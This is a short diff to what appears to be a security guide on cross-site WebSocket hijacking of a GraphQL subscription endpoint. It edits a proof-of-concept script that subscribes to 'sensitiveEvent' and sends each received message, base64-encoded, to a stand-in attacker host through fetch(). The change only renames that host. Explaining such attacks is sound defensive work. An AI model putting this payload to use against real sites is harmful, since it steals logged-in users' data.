@@ -397,7 +397,7 @@ If the WebSocket endpoint relies on cookies and does not validate the Origin hea
     ws.send(JSON.stringify({id:"1",type:"subscribe",
       payload:{query:"subscription { sensitiveEvent { data } }"}}));
   };
-  ws.onmessage = function(e) { fetch("https://attacker.com/c?d="+btoa(e.data)); };
+  ws.onmessage = function(e) { fetch("https://attacker.invalid/c?d="+btoa(e.data)); };
 </script>
 ```
 
